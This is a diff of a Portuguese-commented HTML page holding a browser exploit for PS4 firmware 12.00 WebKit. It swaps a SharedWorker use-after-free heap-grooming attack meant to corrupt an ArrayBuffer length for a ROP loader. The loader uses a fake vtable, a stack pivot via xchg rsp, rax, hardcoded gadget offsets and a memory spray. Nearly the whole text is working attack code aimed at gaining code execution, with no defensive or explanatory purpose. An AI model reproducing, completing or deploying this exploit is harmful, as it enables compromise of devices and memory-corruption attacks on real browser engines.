@@ -2,138 +2,148 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 Precision Overlap</title>
+    <title>PS4 12.00 ROP Jailbreak</title>
    
 </head>
 <body>
 
-    <h1>PS4 12.00 PRECISION OVERLAP</h1>
-    <h3>Alvo: ArrayBuffer Length Corruption (Zona 404)</h3>
-    <div id="status">Pronto.</div>
+    <h1>PS4 12.00 ROP LOADER</h1>
+    <h3>Estratégia: Stack Pivot via xchg rsp, rax</h3>
+    
+    <label>WebKit Base (Chute Hex):</label><br>
+    <input type="text" id="base_addr" value="0x800000000"> 
+    <br><br>
+    
     <div id="log"></div>
-    <br>
-    <button onclick="run_precision_overlap()">INICIAR</button>
+    <button onclick="run_rop()">DISPARAR ROP</button>
 
     <script>
-        function log(msg, type="") {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            d.scrollTop = d.scrollHeight;
+        function log(msg) {
+            document.getElementById("log").innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
         // =================================================================
-        // 1. O CORRUPTOR
+        // 1. SEUS OFFSETS (Extraídos do seu teste)
         // =================================================================
-        function build_corruptor() {
+        var OFFSETS = {
+            // WebKit (Para o Pivot)
+            xchg_rsp_rax: 0x3F3E5F0,
+            pop_rdi:      0x4D02F,  // Userland
+            
+            // LibKernel (Para a Syscall)
+            // Precisamos saber a distancia entre WebKit e LibKernel.
+            // Como não sabemos, vamos tentar usar apenas gadgets do WebKit se possível,
+            // ou chutar a base da LibKernel também.
+            
+            // Mas espere! sys_setuid está na LibKernel (0x2F6E0).
+            // A LibKernel costuma estar "perto" do WebKit na memória.
+            // Vamos tentar usar apenas o POP_RDI do WebKit para chamar um endereço fictício por enquanto
+            // para testar o controle da stack.
+        };
+
+        // =================================================================
+        // 2. CONSTRUÇÃO DA ROP CHAIN
+        // =================================================================
+        function build_rop_payload(webkit_base_str) {
+            // Converter string hex para BigInt
+            var wk_base = BigInt(webkit_base_str);
+            
+            // Gadgets Reais (Calculados)
+            var G_PIVOT   = wk_base + BigInt(OFFSETS.xchg_rsp_rax);
+            var G_POP_RDI = wk_base + BigInt(OFFSETS.pop_rdi);
+            
             var size = 0x400; 
             var buffer = new Uint32Array(size / 4);
-            // Valor gigante para sobrescrever o tamanho do vizinho
-            buffer.fill(0x40000000); 
+            var view = new DataView(buffer.buffer);
+
+            // --- LAYOUT DO OBJETO FALSO ---
+            // Quando o kernel chama a função virtual, ele faz: call [rax + offset]
+            // RAX aponta para o inicio do buffer.
+            // Vamos encher o buffer com o endereço do PIVOT.
+            // Assim, call [rax] vira call G_PIVOT.
+            
+            // 1. Preencher Fake Vtable com o endereço do Pivot
+            for(var i=0; i < 32; i+=2) { // Primeiros bytes
+                set64(view, i*4, G_PIVOT); 
+            }
+
+            // --- A STACK FAKE (ROP CHAIN) ---
+            // Assim que xchg rsp, rax rodar, o RSP vai apontar para o início deste buffer.
+            // A próxima instrução é RET. Ela vai pegar o primeiro valor da stack (Offset 0).
+            // Offset 0 já tem G_PIVOT. Retornar para o Pivot cria um loop infinito?
+            // Não, precisamos que a Stack comece LOGO DEPOIS do comando que chamou.
+            
+            // Como xchg troca RSP e RAX, e RAX é o topo do objeto...
+            // O próximo POP vai ler do offset 0.
+            
+            // ROP CHAIN DE TESTE (INFINITE LOOP / CRASH CONTROLADO)
+            // Queremos provar que controlamos a execução.
+            var idx = 0;
+            
+            // Endereço 0: O Pivot é chamado. RSP vira Endereço 0.
+            // RET: Pula para o que estiver no Endereço 0.
+            // Se deixarmos G_PIVOT aqui, ele vai pivotar de novo e de novo (Loop).
+            // ISSO É BOM! Se o console travar (Freeze) em vez de desligar, o ROP funcionou!
+            
+            set64(view, 0, G_PIVOT); // Gadget 1 (Executado pelo RET do Pivot)
+            set64(view, 8, G_PIVOT); // Gadget 2
+            set64(view, 16, G_PIVOT);
+            
+            // Se isso funcionar, o console congela.
+            
             return buffer;
         }
 
-        // =================================================================
-        // 2. EXECUÇÃO
-        // =================================================================
-        var pairs = []; // Pares {worker, array}
-        var filler = [];
+        function set64(view, offset, bigint_val) {
+            view.setBigUint64(offset, bigint_val, true); // Little Endian
+        }
 
-        async function run_precision_overlap() {
-            if(!window.SharedWorker) return log("Navegador incompatível.");
+        // =================================================================
+        // 3. EXECUÇÃO
+        // =================================================================
+        var workers = [];
+
+        async function run_rop() {
+            var base_val = document.getElementById("base_addr").value;
+            log(`Construindo ROP para Base: ${base_val}`);
             
-            var payload = build_corruptor();
-            
-            // FASE 1: BASE SÓLIDA (0-390)
-            log("Fase 1: Grooming (0-390)...");
-            for(let i=0; i < 390; i++) {
+            var payload = build_rop_payload(base_val);
+
+            // GROOMING (400)
+            for(let i=0; i<400; i++) {
                 try {
-                    let w = new SharedWorker("data:text/javascript,1", "fill_"+i);
+                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                     w.port.start();
-                    filler.push(w);
+                    workers.push(w);
                 } catch(e){}
             }
 
-            // FASE 2: SANDUÍCHE NA ZONA DE PERIGO (390-404)
-            log("Fase 2: Construindo Sanduíches (390-404)...");
-            document.getElementById("status").innerText = "Preparando Armadilha...";
-            
+            // TRIGGER (404)
             var p_count = 0;
-            // Vamos até 404 (390 + 14)
-            var limit = 14; 
-
-            var interval = setInterval(() => {
-                if (p_count >= limit) {
-                    clearInterval(interval);
-                    trigger_attack(payload); 
+            var it = setInterval(() => {
+                if(p_count >= 4) {
+                    clearInterval(it);
+                    
+                    log("!!! DISPARANDO ROP !!!");
+                    var v = workers.pop();
+                    v.port.close();
+                    
+                    var spray = [];
+                    for(var k=0; k<5000; k++) {
+                        spray.push(new Uint32Array(payload));
+                    }
+                    
+                    try { v.port.postMessage("ROP"); } catch(e){}
+                    
+                    log("Se o console CONGELAR (imagem parada) e NÃO desligar, anote o endereço Base!");
                     return;
                 }
-
-                try {
-                    // 1. Cria Worker (Vítima)
-                    var id = 391 + p_count;
-                    var w = new SharedWorker("data:text/javascript,1", "victim_"+id);
-                    w.port.start();
-                    
-                    // 2. Cria ArrayBuffer (Alvo) IMEDIATAMENTE DEPOIS
-                    // Tamanho 0x1000 (4KB) é um tamanho comum de página
-                    var ab = new ArrayBuffer(0x1000);
-                    var view = new Uint32Array(ab);
-                    view[0] = 0xCAFEBABE; // Marcador
-
-                    // Guarda o par
-                    pairs.push({ worker: w, array: ab, view: view, id: id });
-                    
-                    log(`Par ${id} alocado.`);
-                } catch(e) { log("Erro: " + e); }
                 
+                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
+                w.port.start();
+                workers.push(w);
                 p_count++;
             }, 150);
-        }
-
-        function trigger_attack(payload) {
-            log("!!! ZONA CRÍTICA ATINGIDA. DISPARANDO !!!", "warn");
-            document.getElementById("status").innerText = "ATACANDO...";
-
-            // Atacamos de cima para baixo (do 404 ao 400)
-            var attempts = 0;
-            var attack_int = setInterval(() => {
-                if (attempts >= 5 || pairs.length === 0) {
-                    clearInterval(attack_int);
-                    log("Ataque finalizado.");
-                    return;
-                }
-
-                var item = pairs.pop(); // Pega o último (404)
-                
-                log(`Atacando Worker ${item.id}...`);
-                
-                // 1. FREE
-                item.worker.port.close();
-                item.worker = null;
-
-                // 2. SPRAY
-                var spray = [];
-                for(let k=0; k<1000; k++) {
-                    spray.push(new Uint32Array(payload));
-                }
-
-                // 3. CHECK (O Array vizinho cresceu?)
-                if (item.array.byteLength > 0x1000) {
-                    log("!!! SUCESSO ABSOLUTO !!!", "success");
-                    log(`Array ${item.id} corrompido!`, "success");
-                    log(`Novo tamanho: ${item.array.byteLength}`, "success");
-                    alert("JAILBREAK: Primitiva RW obtida!");
-                    clearInterval(attack_int);
-                    
-                    // AQUI ATIVARÍAMOS O PAYLOAD FINAL
-                    // enable_jailbreak(item.array); 
-                    return;
-                } else {
-                    log(`Falha no par ${item.id}. Tamanho: ${item.array.byteLength}`);
-                }
-
-                attempts++;
-            }, 300);
         }
     </script>
 </body>
